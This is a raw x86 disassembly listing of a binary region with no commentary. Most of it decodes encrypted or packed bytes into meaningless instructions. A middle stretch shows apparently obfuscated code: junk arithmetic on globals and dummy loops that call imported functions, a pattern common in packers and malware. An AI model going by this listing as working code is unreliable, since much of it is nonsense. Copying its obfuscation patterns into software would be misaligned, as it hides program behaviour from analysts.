  40ef9f:	pop    ebx
  40efa0:	push   ebp
  40efa1:	inc    ecx
  40efa2:	sbb    eax,0x858fa58c
  40efa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efa8:	(bad)  
  40efaa:	jmp    0x40ef6d
  40efac:	xor    BYTE PTR [ecx+ebp*2-0x5d],al
  40efb0:	mov    dh,0xdf
  40efb2:	pop    ss
  40efb3:	in     eax,dx
  40efb4:	scas   eax,DWORD PTR es:[edi]
  40efb5:	rcpps  xmm2,XMMWORD PTR [ecx-0x43]
  40efb9:	mov    edx,0xfad9d283
  40efbe:	dec    ebp
  40efbf:	push   ebx
  40efc0:	dec    esi
  40efc1:	ret    0x88dd
  40efc4:	aas    
  40efc5:	adc    edi,DWORD PTR [esi-0xb]
  40efc8:	mov    dl,0xa6
  40efca:	cmp    DWORD PTR [ecx+0x31dd498c],0x43
  40efd1:	add    eax,0x4282db12
  40efd6:	aam    0x71
  40efd8:	push   edi
  40efd9:	sbb    DWORD PTR [ecx-0x39804522],0x3e4649a7
  40efe3:	in     eax,0xab
  40efe5:	adc    edx,ecx
  40efe7:	sti    
  40efe8:	div    BYTE PTR [ebx+0x3]
  40efeb:	inc    edx
  40efec:	out    dx,al
  40efed:	iret   
  40efee:	daa    
  40efef:	dec    ebx
  40eff0:	mov    edx,?
  40eff2:	cmc    
  40eff3:	cwde   
  40eff4:	and    al,0x11
  40eff6:	test   al,0x4a
  40eff8:	dec    edx
  40eff9:	jmp    0x40f003
  40effb:	mov    dh,0x21
  40effd:	out    dx,eax
  40effe:	es popa 
  40f000:	cli    
  40f001:	push   edi
  40f002:	pop    ss
  40f003:	push   ebx
  40f004:	push   esp
  40f005:	(bad)  
  40f006:	ins    DWORD PTR es:[edi],dx
  40f007:	and    DWORD PTR [ebp+0x29668f05],ebp
  40f00d:	fisubr DWORD PTR [edi]
  40f00f:	test   BYTE PTR [eax],al
  40f011:	jno    0x40f007
  40f013:	test   eax,0xa8a97961
  40f018:	(bad)  
  40f019:	and    edx,DWORD PTR [esi+0x3f09260a]
  40f01f:	xor    ah,bl
  40f021:	jg     0x40f06e
  40f023:	sub    BYTE PTR [eax],0xc8
  40f026:	mov    edx,0xe5dcd2e9
  40f02b:	in     eax,0x7a
  40f02d:	push   edx
  40f02e:	icebp  
  40f02f:	(bad)  
  40f030:	xchg   ebp,eax
  40f031:	push   0x24bde928
  40f036:	xchg   esp,eax
  40f037:	adc    al,0x7
  40f039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f03a:	mov    ah,0x38
  40f03c:	fild   WORD PTR [ebx+0x1937cf2e]
  40f042:	adc    eax,0x1c42234
  40f047:	ins    DWORD PTR es:[edi],dx
  40f048:	dec    esp
  40f049:	popa   
  40f04a:	mov    ebx,0x2a461653
  40f04f:	or     al,0x9e
  40f051:	xor    BYTE PTR [ecx-0x2],al
  40f054:	mov    dh,0xa
  40f056:	pop    ds
  40f057:	add    DWORD PTR [ebp+0x4a86212],ebx
  40f05d:	jecxz  0x40f024
  40f05f:	iret   
  40f060:	rol    DWORD PTR [esi-0x553df91a],0xfb
  40f067:	adc    al,0x3f
  40f069:	jecxz  0x40f0c8
  40f06b:	pop    ds
  40f06c:	dec    ebp
  40f06d:	push   edi
  40f06e:	push   cs
  40f06f:	sbb    BYTE PTR [eax+eax*2],0x10
  40f073:	or     dh,ah
  40f075:	and    al,0xea
  40f077:	popf   
  40f078:	jne    0x40f0b5
  40f07a:	add    BYTE PTR [esi+eax*2+0x1db25fc1],ch
  40f081:	push   es
  40f082:	mov    ecx,0x78ac3c9e
  40f087:	(bad)  
  40f088:	xor    BYTE PTR [ebx],ch
  40f08a:	js     0x40f08e
  40f08c:	fistp  QWORD PTR [ebp-0x7c]
  40f08f:	or     DWORD PTR [edx-0x2d],edx
  40f092:	and    al,0xed
  40f094:	and    DWORD PTR [ecx-0x27c9bf36],esp
  40f09a:	add    ebx,DWORD PTR [eiz*8+0x75c4f39f]
  40f0a1:	sub    ebp,DWORD PTR [edi-0x2e]
  40f0a4:	xchg   DWORD PTR [ecx-0x4e],ebp
  40f0a7:	pop    edi
  40f0a8:	sbb    DWORD PTR [ebx+0x1368cf07],edx
  40f0ae:	mov    bh,0xb1
  40f0b0:	cs jmp 0x40f0a5
  40f0b3:	mov    eax,ds:0xda3fc082
  40f0b8:	cmp    eax,0x26d940fb
  40f0bd:	outs   dx,DWORD PTR ds:[esi]
  40f0be:	sbb    cl,BYTE PTR [esi-0x754c5314]
  40f0c4:	in     al,0xa
  40f0c6:	pop    edx
  40f0c7:	ds sahf 
  40f0c9:	in     eax,dx
  40f0ca:	in     al,dx
  40f0cb:	inc    ecx
  40f0cc:	mov    ch,0xe
  40f0ce:	lea    edx,[edi+0x1e96ae78]
  40f0d4:	jae    0x40f108
  40f0d6:	mov    edx,0x768441d0
  40f0db:	jno    0x40f140
  40f0dd:	jne    0x40f14a
  40f0df:	mov    eax,ds:0x6cb4741e
  40f0e4:	call   0xa389:0xa0b41607
  40f0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ec:	inc    edx
  40f0ed:	add    bh,BYTE PTR [ebx]
  40f0ef:	inc    eax
  40f0f0:	mov    DWORD PTR [esi-0x38],edx
  40f0f3:	mov    edi,0x427fdc27
  40f0f8:	mov    WORD PTR [ecx+ebp*1+0x1fc2bd1f],es
  40f0ff:	and    ebx,edx
  40f101:	xor    bl,BYTE PTR [eax]
  40f103:	jle    0x40f150
  40f105:	lods   eax,DWORD PTR es:[esi]
  40f107:	or     al,0xcb
  40f109:	into   
  40f10a:	test   al,0xc5
  40f10c:	dec    ecx
  40f10d:	mov    edx,0xf3d3ad88
  40f112:	inc    esp
  40f113:	push   ecx
  40f114:	sbb    ecx,DWORD PTR [edx-0x1b]
  40f117:	ds add ebp,0x36
  40f11b:	enter  0x5e52,0x11
  40f11f:	cmp    edx,DWORD PTR [edi-0x775b3e12]
  40f125:	or     DWORD PTR [esi-0x4e],0xffffff89
  40f129:	not    bx
  40f12c:	data16 fs ins BYTE PTR es:[edi],dx
  40f12f:	mov    esi,DWORD PTR [ebx]
  40f131:	xchg   esi,eax
  40f132:	(bad)  
  40f133:	xor    eax,0x100cefe3
  40f138:	ins    BYTE PTR es:[edi],dx
  40f139:	icebp  
  40f13a:	outs   dx,DWORD PTR ds:[esi]
  40f13b:	outs   dx,BYTE PTR ds:[esi]
  40f13c:	jns    0x40f140
  40f13e:	ins    DWORD PTR es:[edi],dx
  40f13f:	pop    esp
  40f140:	inc    ebx
  40f141:	loopne 0x40f133
  40f143:	adc    cl,BYTE PTR [ebx-0x7d]
  40f146:	or     BYTE PTR [eax+0x45b618ee],cl
  40f14c:	xchg   ebx,eax
  40f14d:	mov    al,ds:0x7f5ca3d2
  40f152:	aaa    
  40f153:	dec    ecx
  40f154:	push   eax
  40f155:	dec    edi
  40f156:	inc    edx
  40f157:	cmp    esi,DWORD PTR [esi]
  40f159:	in     al,dx
  40f15a:	or     esp,ebx
  40f15c:	mov    ah,0x6b
  40f15e:	add    ebp,ebx
  40f160:	push   ss
  40f161:	loopne 0x40f1c2
  40f163:	push   eax
  40f164:	xchg   ecx,eax
  40f165:	adc    BYTE PTR [eax],dh
  40f167:	cmp    cl,al
  40f169:	dec    edi
  40f16a:	push   ss
  40f16b:	cmc    
  40f16c:	ficomp WORD PTR ds:0xd733b15
  40f172:	enter  0x977a,0x60
  40f176:	mov    ch,0x5f
  40f178:	mov    dl,0x1e
  40f17a:	stc    
  40f17b:	push   edi
  40f17c:	dec    edi
  40f17d:	push   edi
  40f17e:	popf   
  40f17f:	mov    edi,DWORD PTR [ecx+0x4f]
  40f182:	repz hlt 
  40f184:	call   0x3c12:0x24c4e827
  40f18b:	stos   DWORD PTR es:[edi],eax
  40f18c:	push   eax
  40f18d:	push   ds
  40f18e:	ins    BYTE PTR es:[edi],dx
  40f18f:	add    al,0x1
  40f191:	inc    ebx
  40f192:	or     bh,BYTE PTR [edi]
  40f194:	lahf   
  40f195:	(bad)  
  40f196:	xchg   edx,eax
  40f197:	stos   BYTE PTR es:[edi],al
  40f198:	cmp    eax,0x398b3d96
  40f19d:	(bad)  
  40f19e:	push   eax
  40f19f:	inc    edx
  40f1a0:	jmp    0x9ff9:0xb9cfbc95
  40f1a7:	test   BYTE PTR [edi-0x7eb1a190],0xf8
  40f1ae:	dec    eax
  40f1af:	cmc    
  40f1b0:	inc    edi
  40f1b1:	outs   dx,DWORD PTR ds:[esi]
  40f1b2:	xor    al,0xd7
  40f1b4:	xchg   edx,eax
  40f1b5:	loope  0x40f14c
  40f1b7:	mov    BYTE PTR [ecx+0x6d8296da],al
  40f1bd:	xor    bh,BYTE PTR [edx+0x27]
  40f1c0:	in     al,dx
  40f1c1:	(bad)  
  40f1c2:	sahf   
  40f1c3:	sub    DWORD PTR [esi+0x5c],0xc469149
  40f1ca:	mov    esi,0x3dd94279
  40f1cf:	scas   al,BYTE PTR es:[edi]
  40f1d0:	scas   al,BYTE PTR es:[edi]
  40f1d1:	push   ebp
  40f1d2:	fsub   DWORD PTR [esi]
  40f1d4:	cmp    bl,ah
  40f1d6:	les    edi,FWORD PTR [edi]
  40f1d8:	jl     0x40f1f2
  40f1da:	inc    ebx
  40f1db:	aam    0x5b
  40f1dd:	xchg   esp,eax
  40f1de:	jb     0x40f1df
  40f1e0:	jnp    0x40f23e
  40f1e2:	mov    al,ds:0x6062328f
  40f1e7:	sub    bh,0x44
  40f1ea:	and    edi,DWORD PTR [ecx-0x61]
  40f1ed:	(bad)  
  40f1ee:	mov    ah,0xcf
  40f1f0:	mov    WORD PTR [edx-0x6f],ss
  40f1f3:	pop    edx
  40f1f4:	mov    DWORD PTR [ebx-0x63],ebx
  40f1f7:	mov    bh,0x96
  40f1f9:	mov    edi,0x1c9254a0
  40f1fe:	ror    edi,cl
  40f200:	jae    0x40f183
  40f202:	(bad)  
  40f203:	or     DWORD PTR [ebp+0x4ebf51a7],ebp
  40f209:	imul   DWORD PTR [edx+0x13b1ccc1]
  40f20f:	xor    eax,0x939b4466
  40f214:	ins    DWORD PTR es:[edi],dx
  40f215:	cld    
  40f216:	sub    DWORD PTR [eax-0x6db1cd2e],edi
  40f21c:	pop    edi
  40f21d:	add    BYTE PTR [eax],al
  40f21f:	and    al,0xae
  40f221:	cmc    
  40f222:	(bad)  
  40f223:	hlt    
  40f224:	adc    edi,DWORD PTR [esi]
  40f226:	not    BYTE PTR [ebx]
  40f228:	ret    
  40f229:	cmp    eax,0xb7172088
  40f22e:	sbb    al,0x33
  40f230:	clc    
  40f231:	xchg   ebx,eax
  40f232:	ss push esp
  40f234:	pop    ds
  40f235:	add    al,0x7b
  40f237:	cmc    
  40f238:	fs jb  0x40f293
  40f23b:	fcmovnbe st,st(4)
  40f23d:	pusha  
  40f23e:	mov    ds:0xc32ff405,eax
  40f243:	imul   edi,edi,0x945bcd8f
  40f249:	inc    edx
  40f24a:	enter  0xa50,0xdc
  40f24e:	cmp    eax,0xd17dcf91
  40f253:	jo     0x40f20f
  40f255:	push   0xffffffa6
  40f257:	cdq    
  40f258:	cmp    DWORD PTR [eax],ebp
  40f25a:	inc    ebx
  40f25b:	and    edx,DWORD PTR [ecx]
  40f25d:	adc    BYTE PTR [esi+0x6a5f83ce],cl
  40f263:	and    esi,ebx
  40f265:	lods   al,BYTE PTR ds:[esi]
  40f266:	test   BYTE PTR [esp+eax*2],ah
  40f269:	dec    esp
  40f26a:	int3   
  40f26b:	and    eax,DWORD PTR [ebp-0x57588ebc]
  40f271:	mov    bl,0x66
  40f273:	call   0x706f:0x660eed22
  40f27a:	leave  
  40f27b:	je     0x40f27e
  40f27d:	dec    ebx
  40f27e:	lods   al,BYTE PTR ds:[esi]
  40f27f:	mov    al,ds:0x7a3c9980
  40f284:	popf   
  40f285:	sbb    al,0x53
  40f287:	es arpl cx,bp
  40f28a:	or     esi,DWORD PTR [ebx+0x1b]
  40f28d:	pop    eax
  40f28e:	mov    gs,WORD PTR [esi+ecx*4]
  40f291:	repz xor ebp,DWORD PTR [ebx]
  40f294:	loope  0x40f2aa
  40f296:	aaa    
  40f297:	cli    
  40f298:	mov    dh,BYTE PTR [edx+0x2d2c03b5]
  40f29e:	pop    esp
  40f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a0:	test   al,0x96
  40f2a2:	jb     0x40f276
  40f2a4:	or     eax,0xf4a980c4
  40f2a9:	mov    esp,0x5ba4f2a9
  40f2ae:	jno    0x40f2e7
  40f2b0:	cs xor eax,0xa72d2219
  40f2b6:	int3   
  40f2b7:	in     eax,dx
  40f2b8:	int    0x74
  40f2ba:	out    dx,al
  40f2bb:	(bad)  [esi+0x45]
  40f2be:	lds    ebp,FWORD PTR [edi]
  40f2c0:	add    al,0x8b
  40f2c2:	scas   eax,DWORD PTR es:[edi]
  40f2c3:	inc    ecx
  40f2c4:	sub    al,0x2e
  40f2c6:	adc    eax,0xfcae7be4
  40f2cb:	js     0x40f31c
  40f2cd:	inc    ebx
  40f2ce:	lods   eax,DWORD PTR ds:[esi]
  40f2cf:	scas   eax,DWORD PTR es:[edi]
  40f2d0:	push   ecx
  40f2d1:	(bad)  
  40f2d2:	or     BYTE PTR [edi],dl
  40f2d4:	(bad)  
  40f2d5:	jmp    DWORD PTR [esi]
  40f2d7:	sub    edi,DWORD PTR [ecx-0x61]
  40f2da:	mov    edi,0x6f36c09a
  40f2df:	in     al,0x60
  40f2e1:	jg     0x40f2c8
  40f2e3:	fistp  QWORD PTR [ecx]
  40f2e5:	cdq    
  40f2e6:	adc    al,0x53
  40f2e8:	or     cl,BYTE PTR [ebx-0x4a]
  40f2eb:	jnp    0x40f2ec
  40f2ed:	fistp  DWORD PTR [ebx+ebx*1-0x1e]
  40f2f1:	(bad)  
  40f2f2:	push   edx
  40f2f3:	push   0xffffffee
  40f2f5:	pusha  
  40f2f6:	(bad)  
  40f2f7:	pop    ds
  40f2f8:	mov    ebx,0x2d5837d6
  40f2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2fe:	xor    DWORD PTR [ecx-0x24],eax
  40f301:	cwde   
  40f302:	cmp    ah,cl
  40f304:	mov    eax,ds:0xe82c8ed4
  40f309:	fdivrp st(3),st
  40f30b:	in     al,dx
  40f30c:	sbb    al,0xbc
  40f30e:	mov    al,0x58
  40f310:	xor    ebp,DWORD PTR [ebp-0x212bb4e]
  40f316:	add    edx,DWORD PTR [ecx+0x46eb4bd2]
  40f31c:	aad    0xb1
  40f31e:	jae    0x40f2c9
  40f320:	mov    ah,dl
  40f322:	hlt    
  40f323:	jnp    0x40f372
  40f325:	add    edi,DWORD PTR [edx-0x45]
  40f328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f329:	push   0xbfc80f94
  40f32e:	rcl    dh,cl
  40f330:	and    al,BYTE PTR [ebp+0xe]
  40f333:	jp     0x40f2d0
  40f335:	xchg   esi,eax
  40f336:	push   es
  40f337:	cmc    
  40f338:	push   0xe6007c50
  40f33d:	sbb    dl,BYTE PTR es:[eax+eax*4-0x28]
  40f342:	sub    eax,0x375ff5f2
  40f347:	arpl   cx,dx
  40f349:	sub    eax,0x6b7c1d5a
  40f34e:	fwait
  40f34f:	xlat   BYTE PTR gs:[ebx]
  40f351:	(bad)  
  40f352:	sub    al,BYTE PTR [ebx]
  40f354:	xlat   BYTE PTR ds:[ebx]
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	mov    bh,0x6d
  40f709:	pop    esp
  40f70a:	sbb    ah,0xcd
  40f70d:	jl     0x40f78b
  40f70f:	jmp    0x40f770
  40f711:	jl     0x40f78f
  40f713:	das    
  40f714:	jo     0x40f76a
  40f716:	cs inc edx
  40f718:	sub    BYTE PTR ds:0xda0c4162,ah
  40f71e:	mov    edx,0xcb242400
  40f723:	mov    bh,0xe
  40f725:	push   es
  40f726:	and    al,0xe3
  40f728:	push   edi
  40f729:	jnp    0x40f77a
  40f72b:	ja     0x40f6f9
  40f72d:	adc    ch,BYTE PTR [edi-0x7faf6210]
  40f733:	fild   DWORD PTR [ebx+edi*1+0x398ccea2]
  40f73a:	push   cs
  40f73b:	xor    ecx,DWORD PTR [eax]
  40f73d:	pop    eax
  40f73e:	sbb    al,0xb3
  40f740:	lods   al,BYTE PTR ds:[esi]
  40f741:	test   eax,0xa07c1536
  40f746:	jb     0x40f6fe
  40f748:	xlat   BYTE PTR ds:[ebx]
  40f749:	fwait
  40f74a:	and    DWORD PTR [eax-0x2cb415bc],0x12f43eb6
  40f754:	shl    BYTE PTR ds:[ebp+0x6591242f],cl
  40f75b:	mul    BYTE PTR [edx+eax*2]
  40f75e:	cmp    DWORD PTR [edx],0x452086db
  40f764:	mov    ebp,0xeb8ace01
  40f769:	in     al,0x6
  40f76b:	imul   BYTE PTR [ecx+0x181fe204]
  40f771:	fwait
  40f772:	jne    0x40f746
  40f774:	aam    0x1c
  40f776:	inc    esp
  40f777:	outs   dx,BYTE PTR ds:[esi]
  40f778:	push   0xdaefe8f0
  40f77d:	inc    edx
  40f77e:	loopne 0x40f745
  40f780:	imul   edx,DWORD PTR [edx],0x11343f08
  40f786:	dec    esp
  40f787:	and    edx,DWORD PTR [ebx-0x1042b280]
  40f78d:	jo     0x40f7e9
  40f78f:	jne    0x40f73c
  40f791:	out    0x7f,al
  40f793:	jg     0x40f764
  40f795:	in     al,dx
  40f796:	pop    edx
  40f797:	js     0x40f776
  40f799:	jmp    0xfd690062
  40f79e:	xchg   DWORD PTR [ebx+ebp*2],esp
  40f7a1:	in     al,0xb7
  40f7a3:	repz je 0x40f7b0
  40f7a6:	test   al,0xf5
  40f7a8:	cmc    
  40f7a9:	dec    esp
  40f7aa:	rcl    DWORD PTR [ebx-0x33b377dd],cl
  40f7b0:	ffreep st(1)
  40f7b2:	add    eax,0x545423ef
  40f7b7:	(bad)  
  40f7b8:	rcr    DWORD PTR [edi+0x34],cl
  40f7bb:	inc    ecx
  40f7bc:	jle    0x40f787
  40f7be:	or     BYTE PTR [ecx-0x2cd54cc0],al
  40f7c4:	push   ebx
  40f7c5:	jecxz  0x40f80a
  40f7c7:	push   ss
  40f7c8:	jb     0x40f751
  40f7ca:	(bad)  
  40f7cb:	cmc    
  40f7cc:	lods   eax,DWORD PTR ds:[esi]
  40f7cd:	mov    DWORD PTR [eax+0x4d],ecx
  40f7d0:	stc    
  40f7d1:	pusha  
  40f7d2:	iret   
  40f7d3:	mov    esp,DWORD PTR [ebx]
  40f7d5:	inc    eax
  40f7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d7:	cdq    
  40f7d8:	jmp    0x524560f2
  40f7dd:	in     al,dx
  40f7de:	sbb    edx,DWORD PTR [esi-0x59051feb]
  40f7e4:	or     eax,0xfe291ebb
  40f7e9:	mov    ch,0x2
  40f7eb:	loopne 0x40f7e5
  40f7ed:	scas   al,BYTE PTR es:[edi]
  40f7ee:	mov    DWORD PTR ds:0xee3b2894,ebp
  40f7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f5:	or     al,0xfc
  40f7f7:	add    al,0xaa
  40f7f9:	xchg   edi,eax
  40f7fa:	fwait
  40f7fb:	mov    edx,0xe5c54c35
  40f800:	xchg   esp,eax
  40f801:	test   DWORD PTR [esi],edx
  40f803:	fstenv ds:0x7243a236
  40f80a:	(bad)  
  40f80b:	aam    0x75
  40f80d:	pop    eax
  40f80e:	popf   
  40f80f:	jp     0x40f79d
  40f811:	sar    BYTE PTR [edi+0x7f],1
  40f814:	shl    esp,1
  40f816:	mov    esp,0xb906cc14
  40f81b:	jbe    0x40f88b
  40f81d:	mov    DWORD PTR [ebp-0x73],edi
  40f820:	and    ch,BYTE PTR [edi]
  40f822:	jb     0x40f7bb
  40f824:	mov    al,ds:0x3c97944d
  40f829:	xchg   ebp,eax
  40f82a:	dec    esp
  40f82b:	mov    al,ds:0xb6ce4480
  40f830:	xlat   BYTE PTR ds:[ebx]
  40f831:	jle    0x40f7e8
  40f833:	ss mov ch,0xf8
  40f836:	mov    ds:0x4e437fbd,al
  40f83b:	ret    
  40f83c:	mov    ecx,0x9b3245bd
  40f841:	jb     0x40f802
  40f843:	mov    ds:0xc9b2d2ba,al
  40f848:	clc    
  40f849:	lods   eax,DWORD PTR ds:[esi]
